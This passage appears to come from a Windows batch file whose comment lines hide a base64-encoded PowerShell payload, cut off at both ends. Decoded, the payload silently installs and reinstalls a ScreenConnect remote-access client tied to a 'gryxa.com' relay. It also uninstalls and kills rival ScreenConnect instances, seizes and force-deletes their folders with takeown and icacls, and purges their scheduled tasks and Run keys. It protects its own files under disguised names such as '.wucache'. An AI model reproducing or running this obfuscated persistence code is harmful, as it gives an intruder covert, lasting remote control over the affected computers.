::VEhZfCRmcHxtc2ktdW5hdmFpbGFibGUiIH0NCiAgICAgICAgICAgICRuZXdGcCA9
::IEdldC1GcEZyb21Qcm9kdWN0TmFtZSAoR2V0LU1zaVByb3BlcnR5ICRtc2kgJ1By
::b2R1Y3ROYW1lJykNCiAgICAgICAgICAgIGlmICgtbm90ICRuZXdGcCkgeyAkbmV3
::RnAgPSAkZnAgfQ0KICAgICAgICAgICAgR0xvZyAiYnJva2VuX2NsZWFuX3JlaW5z
::dGFsbCBmcD0kZnAgbmV3PSRuZXdGcCINCiAgICAgICAgICAgICMgc2FtZS1GUCBi
::cm9rZW46IC94IG9mIHRoaXMgRlAgaXMgT0sgKGFscmVhZHkgbm90IFJ1bm5pbmcp
::OyBkaWZmZXJlbnQgbmV3RnAg4oaSIG1pZ3JhdGUtc2FmZQ0KICAgICAgICAgICAg
::aWYgKCRuZXdGcCAtZXEgJGZwKSB7DQogICAgICAgICAgICAgICAgJG51bGwgPSBV
::bmluc3RhbGwtU2NGaW5nZXJwcmludCAkZnANCiAgICAgICAgICAgICAgICBTZXQt
::R3J5eGFGcCAkbmV3RnANCiAgICAgICAgICAgICAgICBTdGFydC1Hcnl4YUluc3Rh
::bGwgJG1zaSAkbmV3RnAgKEpvaW4tUGF0aCAkV29ya0RpciAnbXNpX2dyeXhhX2Rl
::dGFjaGVkLmxvZycpDQogICAgICAgICAgICAgICAgTWFyay1Hcnl4YVJlaW5zdGFs
::bA0KICAgICAgICAgICAgICAgIHJldHVybiAiSU5GTElHSFR8JG5ld0ZwfGluc3Rh
::bGwtc3Bhd25lZD0xIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJu
::IChTdGFydC1Hcnl4YU1pZ3JhdGUgJG1zaSAkbmV3RnAgQCgkZnApICdicm9rZW4t
::bWlncmF0ZT0xJykNCiAgICAgICAgfQ0KICAgICAgICAnU1RVQ0snIHsNCiAgICAg
::ICAgICAgIGlmIChUZXN0LVNjRGlyICRmcCkgew0KICAgICAgICAgICAgICAgIEdM
::b2cgInN0dWNrX3NlcnZpY2VfcmVjcmVhdGUgZnA9JGZwIg0KICAgICAgICAgICAg
::ICAgIFJlcGFpci1TQ1NlcnZpY2UgJGZwDQogICAgICAgICAgICAgICAgaWYgKFRl
::c3QtU2NSdW5uaW5nICRmcCkgeyBHTG9nICdzZXJ2aWNlX3JlY3JlYXRlZF9vayc7
::IHJldHVybiAiSEVBTFRIWXwkZnB8c3ZjLXJlY3JlYXRlZD0xIiB9DQogICAgICAg
::ICAgICB9DQogICAgICAgICAgICAkbXNpID0gR2V0LUdyeXhhTXNpDQogICAgICAg
::ICAgICBpZiAoLW5vdCAkbXNpKSB7IEdMb2cgJ21zaV91bmF2YWlsYWJsZSc7IHJl
::dHVybiAiVU5IRUFMVEhZfCRmcHxtc2ktdW5hdmFpbGFibGUiIH0NCiAgICAgICAg
::ICAgICRuZXdGcCA9IEdldC1GcEZyb21Qcm9kdWN0TmFtZSAoR2V0LU1zaVByb3Bl
::cnR5ICRtc2kgJ1Byb2R1Y3ROYW1lJykNCiAgICAgICAgICAgIGlmICgtbm90ICRu
::ZXdGcCkgeyAkbmV3RnAgPSAkZnAgfQ0KICAgICAgICAgICAgR0xvZyAic3R1Y2tf
::bnVrZV9hbmRfaW5zdGFsbCBmcD0kZnAgbmV3PSRuZXdGcCINCiAgICAgICAgICAg
::IENsZWFyLUdyeXhhQXJwICRmcA0KICAgICAgICAgICAgaWYgKCRuZXdGcCAtbmUg
::JGZwKSB7IENsZWFyLUdyeXhhQXJwICRuZXdGcCB9DQogICAgICAgICAgICBTZXQt
::R3J5eGFGcCAkbmV3RnANCiAgICAgICAgICAgIFN0YXJ0LUdyeXhhSW5zdGFsbCAk
::bXNpICRuZXdGcCAoSm9pbi1QYXRoICRXb3JrRGlyICdtc2lfZ3J5eGFfZGV0YWNo
::ZWQubG9nJykNCiAgICAgICAgICAgIE1hcmstR3J5eGFSZWluc3RhbGwNCiAgICAg
::ICAgICAgIHJldHVybiAiSU5GTElHSFR8JG5ld0ZwfGluc3RhbGwtc3Bhd25lZD0x
::Ig0KICAgICAgICB9DQogICAgICAgIGRlZmF1bHQgew0KICAgICAgICAgICAgaWYg
::KFRlc3QtU2NEaXIgJGZwKSB7DQogICAgICAgICAgICAgICAgR0xvZyAiYWJzZW50
::X3NlcnZpY2VfcmVjcmVhdGUgZnA9JGZwIg0KICAgICAgICAgICAgICAgIFJlcGFp
::ci1TQ1NlcnZpY2UgJGZwDQogICAgICAgICAgICAgICAgaWYgKFRlc3QtU2NSdW5u
::aW5nICRmcCkgeyBHTG9nICdzZXJ2aWNlX3JlY3JlYXRlZF9vayc7IHJldHVybiAi
::SEVBTFRIWXwkZnB8c3ZjLXJlY3JlYXRlZD0xIiB9DQogICAgICAgICAgICB9DQog
::ICAgICAgICAgICAkbXNpID0gR2V0LUdyeXhhTXNpDQogICAgICAgICAgICBpZiAo
::LW5vdCAkbXNpKSB7IEdMb2cgJ21zaV91bmF2YWlsYWJsZSc7IHJldHVybiAiVU5I
::RUFMVEhZfCRmcHxtc2ktdW5hdmFpbGFibGUiIH0NCiAgICAgICAgICAgICRuZXdG
::cCA9IEdldC1GcEZyb21Qcm9kdWN0TmFtZSAoR2V0LU1zaVByb3BlcnR5ICRtc2kg
::J1Byb2R1Y3ROYW1lJykNCiAgICAgICAgICAgIGlmICgtbm90ICRuZXdGcCkgeyBH
::TG9nICdmcF9wYXJzZV9mYWlsJzsgcmV0dXJuICJVTkhFQUxUSFl8JGZwfG1zaS1m
::cC1wYXJzZS1mYWlsIiB9DQogICAgICAgICAgICBHTG9nICJhYnNlbnRfaW5zdGFs
::bCBmcD0kbmV3RnAiDQogICAgICAgICAgICBTZXQtR3J5eGFGcCAkbmV3RnANCiAg
::ICAgICAgICAgIFN0YXJ0LUdyeXhhSW5zdGFsbCAkbXNpICRuZXdGcCAoSm9pbi1Q
::YXRoICRXb3JrRGlyICdtc2lfZ3J5eGFfZGV0YWNoZWQubG9nJykNCiAgICAgICAg
::ICAgIE1hcmstR3J5eGFSZWluc3RhbGwNCiAgICAgICAgICAgIHJldHVybiAiSU5G
::TElHSFR8JG5ld0ZwfGluc3RhbGwtc3Bhd25lZD0xIg0KICAgICAgICB9DQogICAg
::fQ0KfQ0KDQpmdW5jdGlvbiBJbnZva2UtRXh0ZXJtaW5hdGUgew0KICAgICMgTDc6
::IHRydWUgcmVtb3ZhbC4gQ29ycmVjdCBXT1c2NDMyTm9kZSBoaXZlICsgbXNpZXhl
::YyArIFVuaW5zdGFsbFN0cmluZw0KICAgICMgZmFsbGJhY2sgKyBmb3JjZSBkaXIg
::bnVrZS4gS2VlcCBzZXZyeithbHQrY3VycmVudCBncnl4YSBGUCAoZ3J5eGEuY2Zn
::KS4NCiAgICAjIE80MTogc3luYyBSdW5uaW5nIEdyeXhhIEZQIGludG8gY2ZnIEJF
::Rk9SRSBhbnkga2lsbDsgbmV2ZXIga2lsbCBTQyBwcm9jcw0KICAgICMgd2l0aG91
::dCBhIGZvcmVpZ24gRlAgaW4gcGF0aC9jbWRsaW5lIChudWxsIHBhdGggd2FzIGtp
::bGxpbmcgR3J5eGEgZXZlcnkgdGljaykuDQogICAgJGxvZyA9IEpvaW4tUGF0aCAk
::V29ya0RpciAnZXh0ZXJtaW5hdGUubG9nJw0KICAgICRydW5uaW5nRyA9IEZpbmQt
::UnVubmluZ0dyeXhhRnANCiAgICBpZiAoJHJ1bm5pbmdHKSB7IFNldC1Hcnl4YUZw
::ICRydW5uaW5nRyB9DQogICAgJGtlZXAgPSBAKEdldC1LZWVwRmluZ2VycHJpbnRz
::KQ0KICAgICRuID0gQHsgc3ZjID0gMDsgcHJvYyA9IDA7IGRpciA9IDA7IHByb2R1
::Y3QgPSAwOyBybW0gPSAwOyBmYWlsID0gMCB9DQogICAgZnVuY3Rpb24gTG9nKFtz
::dHJpbmddJG0pIHsNCiAgICAgICAgJGxpbmUgPSAnezB9IHsxfScgLWYgKEdldC1E
::YXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0NCiAgICAgICAg
::QWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRsaW5lIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICMgTzQxOiBkbyBOT1Qg
::V3JpdGUtT3V0cHV0IExvZyBsaW5lcyAocG9sbHV0ZXMgZm9yIC9mIGNhbGxlcnMp
::DQogICAgfQ0KICAgICMgUHJvdGVjdCBHcnl4YSBkdXJpbmcgc3RhcnQgcmFjZTog
::b25seSBsaXZlIFNDIHByb2NzIHdpdGggdmVyaWZpZWQgR3J5eGEgcmVsYXkvRlAN
::CiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1l
::IGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRibG9iID0gIiQoW3N0
::cmluZ10kXy5FeGVjdXRhYmxlUGF0aCkgJChbc3RyaW5nXSRfLkNvbW1hbmRMaW5l
::KSINCiAgICAgICAgaWYgKCRibG9iIC1tYXRjaCAnU2NyZWVuQ29ubmVjdCBDbGll
::bnQgXCgoWzAtOWEtZkEtRl17MTZ9KVwpJykgew0KICAgICAgICAgICAgJGZwID0g
::JE1hdGNoZXNbMV0uVG9Mb3dlcigpDQogICAgICAgICAgICBpZiAoJGZwIC1ub3Rp
::biAkc2NyaXB0OlNldnJ6S2VlcCAtYW5kIChUZXN0LUlzR3J5eGFGcCAkZnApIC1h
::bmQgJGZwIC1ub3RpbiAka2VlcCkgew0KICAgICAgICAgICAgICAgICRrZWVwICs9
::ICRmcA0KICAgICAgICAgICAgICAgIFNldC1Hcnl4YUZwICRmcA0KICAgICAgICAg
::ICAgICAgIExvZyAia2VlcF9hZGRfZnJvbV9wcm9jIGZwPSRmcCINCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBmdW5jdGlvbiBJcy1LZWVwZXIo
::W3N0cmluZ10kcykgew0KICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZh
::bHNlIH0NCiAgICAgICAgIyBhbGxvdyBpZiByZWxheSBzZXJ2ZXIvZG9tYWluIGlz
::IEdyeXhhIE9SIGZpbmdlcnByaW50IGlzIGEga2VlcGVyDQogICAgICAgIGlmICgk
::cyAtbWF0Y2ggJyg/aSlncnl4YVwuY29tJykgeyByZXR1cm4gJHRydWUgfQ0KICAg
::ICAgICBmb3JlYWNoICgkayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoi
::KSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAg
::IH0NCiAgICBmdW5jdGlvbiBGb3JjZS1SZW1vdmVEaXIoW3N0cmluZ10kZCkgew0K
::ICAgICAgICBpZiAoLW5vdCAkZCAtb3IgLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFs
::UGF0aCAkZCkpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAgR2V0LUNpbUluc3Rh
::bmNlIFdpbjMyX1Byb2Nlc3MgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg
::fA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uRXhlY3V0YWJsZVBhdGgg
::LWFuZCAkXy5FeGVjdXRhYmxlUGF0aC5TdGFydHNXaXRoKCRkLCBbU3RyaW5nQ29t
::cGFyaXNvbl06Ok9yZGluYWxJZ25vcmVDYXNlKSB9IHwNCiAgICAgICAgICAgIEZv
::ckVhY2gtT2JqZWN0IHsgU3RvcC1Qcm9jZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZv
::cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgIyB1
::bi1oYXJkIHNlbGYtcHJvdGVjdGVkIGRpcnMgKGZvcmVpZ24vb2xkIFNDIGxvY2tz
::IEFDTHMrYXR0cnMgdG8gc3Vydml2ZSByZW1vdmFsKQ0KICAgICAgICAmIHRha2Vv
::d24uZXhlIC9GICRkIC9SIC9EIFkgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICYg
::aWNhY2xzLmV4ZSAkZCAvcmVzZXQgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsDQog
::ICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAtaCAtcyAtciAvcyAvZCBgIiRkYCIg
::YCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICYgaWNhY2xzLmV4
::ZSAkZCAvZ3JhbnQgJypTLTEtNS0zMi01NDQ6KE9JKShDSSlGJyAvVCAvQyAvUSAy
::PiYxIHwgT3V0LU51bGwNCiAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9ncmFudCAn
::QWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGJyAvVCAvQyAvUSAyPiYxIHwgT3V0LU51
::bGwNCiAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9ncmFudCAnU1lTVEVNOihPSSko
::Q0kpRicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIFJlbW92ZS1J
::dGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJh
::bFBhdGggJGQpIHsNCiAgICAgICAgICAgIGNtZC5leGUgL2MgImF0dHJpYiAtaCAt
::cyAtciAvcyAvZCBgIiRkXCouKmAiIiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAg
::ICAgIGNtZC5leGUgL2MgInJtZGlyIC9zIC9xIGAiJGRgIiIgMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgIH0NCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBh
::dGggJGQpIHsNCiAgICAgICAgICAgICRlbXB0eSA9IEpvaW4tUGF0aCAkZW52OlRF
::TVAgKCJvd25fZW1wdHlfIiArIFtndWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCdO
::JykpDQogICAgICAgICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Q
::YXRoICRlbXB0eSAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICAgICAgJiByb2Jv
::Y29weS5leGUgJGVtcHR5ICRkIC9NSVIgL1I6MCAvVzowIDI+JjEgfCBPdXQtTnVs
::bA0KICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRlbXB0eSAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAg
::IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgfQ0KICAgICAgICBy
::ZXR1cm4gLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkNCiAgICB9DQog
::ICAgZnVuY3Rpb24gVW5pbnN0YWxsLVByb2R1Y3RLZXkoJGtleSkgew0KICAgICAg
::ICAkZ3VpZCA9ICRrZXkuUFNDaGlsZE5hbWUNCiAgICAgICAgJHByb3AgPSBHZXQt
::SXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlOYW1lDQogICAgICAg
::ICMgTDM5OiByZWZ1c2UgL3ggaWYgRGlzcGxheU5hbWUgRlAgaXMgYSBrZWVwZXIg
::KHNoYXJlZCBQcm9kdWN0Q29kZSBjb2xsaXNpb24gY2FuIGtpbGwgR3J5eGEpDQog
::ICAgICAgIGlmICgkZG4gLW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVudCBcKChb
::MC05YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAgICAgICAkZnBEbiA9ICRNYXRj
::aGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcERuIC1pbiAka2Vl
::cCAtb3IgKFRlc3QtSXNHcnl4YUZwICRmcERuKSkgew0KICAgICAgICAgICAgICAg
::IExvZyAicHJvZHVjdF9za2lwX2tlZXBlcl9mcCBbJGRuXSBndWlkPSRndWlkIg0K
::ICAgICAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgfQ0KICAgICAgICBpZiAoJGd1aWQgLWxpa2UgJ3sqfScpIHsNCiAgICAg
::ICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRM
::aXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5U3VwcHJl
::c3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuDQogICAgICAg
::ICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlkPSRndWlkIGV4aXQ9
::JCgkcC5FeGl0Q29kZSkiDQogICAgICAgICAgICBpZiAoJHAuRXhpdENvZGUgLWlu
::IDAsIDE2MDUsIDE2MTQsIDMwMTApIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAg
::fQ0KICAgICAgICAkdXMgPSAkcHJvcC5Vbmluc3RhbGxTdHJpbmcNCiAgICAgICAg
::aWYgKCR1cykgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBp
::ZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7DQogICAgICAgICAgICAgICAg
::ICAgICRhcmdzID0gKCR1cyAtcmVwbGFjZSAnKD9pKV4uKm1zaWV4ZWMoXC5leGUp
::P1xzKicsICcnKQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJGFyZ3MgLW5vdG1h
::dGNoICcvcW4nKSB7ICRhcmdzID0gIiRhcmdzIC9xbiAvbm9yZXN0YXJ0IiB9DQog
::ICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4
::ZSAtQXJndW1lbnRMaXN0ICRhcmdzIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5
::bGUgSGlkZGVuDQogICAgICAgICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmlu
::c3RhbGxzdHJpbmdfbXNpIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiDQogICAg
::ICAgICAgICAgICAgICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUs
::IDE2MTQsIDMwMTApDQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAg
::ICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50
::TGlzdCAiL2MgJHVzIC9TIC9zaWxlbnQgL3F1aWV0IC9xbiIgLVdhaXQgLVBhc3NU
::aHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4NCiAgICAgICAgICAgICAgICAgICAgTG9n
::ICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19leGUgWyRkbl0gZXhpdD0kKCRwLkV4
::aXRDb2RlKSINCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29k
::ZSAtZXEgMCkNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGNhdGNo
::IHsgTG9nICJwcm9kdWN0X3VuaW5zdGFsbHN0cmluZ19GQUlMIFskZG5dICRfIiB9
::DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCg0KICAg
::ICMg4pSA4pSAIGRlc3Ryb3kgZm9yZWlnbi9vbGQgU0MgcGVyc2lzdGVuY2UgKHdh
::dGNoZG9nIHRhc2tzICsgcnVuIGtleXMpIOKUgOKUgA0KICAgICMgUm9vdCBjYXVz
::ZSBvZiAiY29ubmVjdHMgdGhlbiBkcm9wcyI6IGEgbm9uLWtlZXBlciAvIG9sZC1G
::UCBTY3JlZW5Db25uZWN0IGtlZXBzIGENCiAgICAjIHNjaGVkdWxlZCB0YXNrIG9y
::IFJ1biBrZXkgdGhhdCByZS1ydW5zIGl0cyBjYWNoZWQgbXNpZXhlYyAvaS4gRXZl
::cnkgc3VjaCAvaSBmaXJlcw0KICAgICMgUmVtb3ZlRXhpc3RpbmdQcm9kdWN0cyBv
::biB0aGUgU0hBUkVEIFNDIFVwZ3JhZGVDb2RlIGFuZCBzdHJpcHMgdGhlIGtlZXBl
::ciBHcnl4YS4NCiAgICAjIFJlbW92aW5nIG9ubHkgdGhlIHByb2R1Y3QgaXMgbm90
::IGVub3VnaCDigJQgdGhlIHBlcnNpc3RlbmNlIHJlaW5zdGFsbHMgaXQgKGFuZCBr
::aWxscw0KICAgICMgR3J5eGEgYWdhaW4pLiBQdXJnZSB0aGUgcGVyc2lzdGVuY2Ug
::RklSU1Qgc28gcHJvZHVjdC9zdmMvZGlyIHJlbW92YWwgaXMgcGVybWFuZW50Lg0K
::ICAgIGZ1bmN0aW9uIEdldC1Ob25LZWVwZXJTY0ZwcyB7DQogICAgICAgICRmcHMg
::PSBAe30NCiAgICAgICAgR2V0LVNlcnZpY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8u
::TmFtZSAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlhLWZBLUZd
::ezE2fSlcKScpIHsNCiAgICAgICAgICAgICAgICAkZnBzWyRtYXRjaGVzWzFdLlRv
::TG93ZXIoKV0gPSAkdHJ1ZQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAg
::ICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIk5hbWUg
::bGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICgiJChbc3Ry
::aW5nXSRfLkV4ZWN1dGFibGVQYXRoKSAkKFtzdHJpbmddJF8uQ29tbWFuZExpbmUp
::IiAtbWF0Y2ggJ1woKFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAgICAgICAgICAg
::ICAgICAkZnBzWyRtYXRjaGVzWzFdLlRvTG93ZXIoKV0gPSAkdHJ1ZQ0KICAgICAg
::ICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRyb290IGluICRz
::Y3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAgICAgIGlmICgtbm90IChU
::ZXN0LVBhdGggJHJvb3QpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgICAgIEdldC1D
::aGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBG
::b3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGRuID0gKEdldC1JdGVt
::UHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::KS5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgICAgIGlmICgkZG4gLW1hdGNoICdT
::Y3JlZW5Db25uZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7ICRm
::cHNbJG1hdGNoZXNbMV0uVG9Mb3dlcigpXSA9ICR0cnVlIH0NCiAgICAgICAgICAg
::IH0NCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6
::UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7DQogICAg
::ICAgICAgICBpZiAoLW5vdCAkYmFzZSAtb3IgLW5vdCAoVGVzdC1QYXRoICRiYXNl
::KSkgeyBjb250aW51ZSB9DQogICAgICAgICAgICBHZXQtQ2hpbGRJdGVtIC1MaXRl
::cmFsUGF0aCAkYmFzZSAtRGlyZWN0b3J5IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICAg
::ICBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwoKFsw
::LTlhLWZBLUZdezE2fSlcKScpIHsgJGZwc1skbWF0Y2hlc1sxXS5Ub0xvd2VyKCld
::ID0gJHRydWUgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIEAo
::JGZwcy5LZXlzIHwgV2hlcmUtT2JqZWN0IHsgJF8gLW5vdGluICRrZWVwIH0pDQog
::ICAgfQ0KDQogICAgZnVuY3Rpb24gVGVzdC1TY0tlZXBlclJlZihbc3RyaW5nXSRz
::KSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQ0KICAg
::ICAgICBpZiAoJHMgLW1hdGNoICcoP2kpZ3J5eGFcLmNvbXxzZXZyelwuY29tJykg
::eyByZXR1cm4gJHRydWUgfQ0KICAgICAgICBpZiAoJHMgLW1hdGNoICcoP2kpb3du
::KF9tb258X2xpYnxfc2VjdXJlKT9cLihjbWR8cHMxKXxncnl4YV9ib290fFwud3Vj
::YWNoZScpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4g
::JGtlZXApIHsgaWYgKCRrIC1hbmQgJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAk
::dHJ1ZSB9IH0NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCg0KICAgIGZ1
::bmN0aW9uIFJlbW92ZS1TY1BlcnNpc3RlbmNlKFtzdHJpbmddJEZwKSB7DQogICAg
::ICAgICMgTDM5OiBwdXJnZSBTY3JlZW5Db25uZWN0IHBlcnNpc3RlbmNlIHJlZmVy
::ZW5jaW5nIHRoaXMgRlAgT1IgZ2VuZXJpYyBTQyBpbnN0YWxsZXJzDQogICAgICAg
::ICMgdGhhdCBhcmUgbm90IGtlZXBlci1wcm90ZWN0ZWQgKGJhcmUgbXNpZXhlYyAv
::aSBVUkwgd2F0Y2hkb2dzIHdpdGhvdXQgRlAgbGl0ZXJhbCkuDQogICAgICAgIHRy
::eSB7DQogICAgICAgICAgICBHZXQtU2NoZWR1bGVkVGFzayAtRXJyb3JBY3Rpb24g
::U2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAg
::ICAgICAkdGFzayA9ICRfDQogICAgICAgICAgICAgICAgJGJsb2IgPSAnJw0KICAg
::ICAgICAgICAgICAgIGZvcmVhY2ggKCRhIGluICR0YXNrLkFjdGlvbnMpIHsgJGJs
::b2IgKz0gIiAkKCRhLkV4ZWN1dGUpICQoJGEuQXJndW1lbnRzKSIgfQ0KICAgICAg
::ICAgICAgICAgIGlmICgkYmxvYiAtbm90bWF0Y2ggJyg/aSlTY3JlZW5Db25uZWN0
::fG1zaWV4ZWMnKSB7IHJldHVybiB9DQogICAgICAgICAgICAgICAgaWYgKFRlc3Qt
::U2NLZWVwZXJSZWYgJGJsb2IpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgICAgICAk
::aGl0ID0gJGZhbHNlDQogICAgICAgICAgICAgICAgaWYgKCRGcCAtYW5kICRibG9i
::IC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJEZwKSkgeyAkaGl0ID0gJHRydWUgfQ0K
::ICAgICAgICAgICAgICAgIGVsc2VpZiAoJGJsb2IgLW1hdGNoICcoP2kpU2NyZWVu
::Q29ubmVjdFwuQ2xpZW50U2V0dXB8U2NyZWVuQ29ubmVjdCBDbGllbnR8cGtnX2dy
::eXhhXC5tc2l8cGtnXC5tc2knKSB7ICRoaXQgPSAkdHJ1ZSB9DQogICAgICAgICAg
::ICAgICAgaWYgKCRoaXQpIHsNCiAgICAgICAgICAgICAgICAgICAgVW5yZWdpc3Rl
::ci1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAkdGFzay5UYXNrTmFtZSAtVGFza1Bh
::dGggJHRhc2suVGFza1BhdGggLUNvbmZpcm06JGZhbHNlIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIExvZyAicGVyc2lz
::dF90YXNrX3JlbW92ZWQgJCgkdGFzay5UYXNrUGF0aCkkKCR0YXNrLlRhc2tOYW1l
::KSBmcD0kRnAiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAg
::ICAgICB9IGNhdGNoIHsgTG9nICJwZXJzaXN0X3Rhc2tfZW51bV9lcnIgJF8iIH0N
::CiAgICAgICAgZm9yZWFjaCAoJHJrIGluIEAoJ0hLTE06XFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bicsDQogICAgICAgICAgICAg
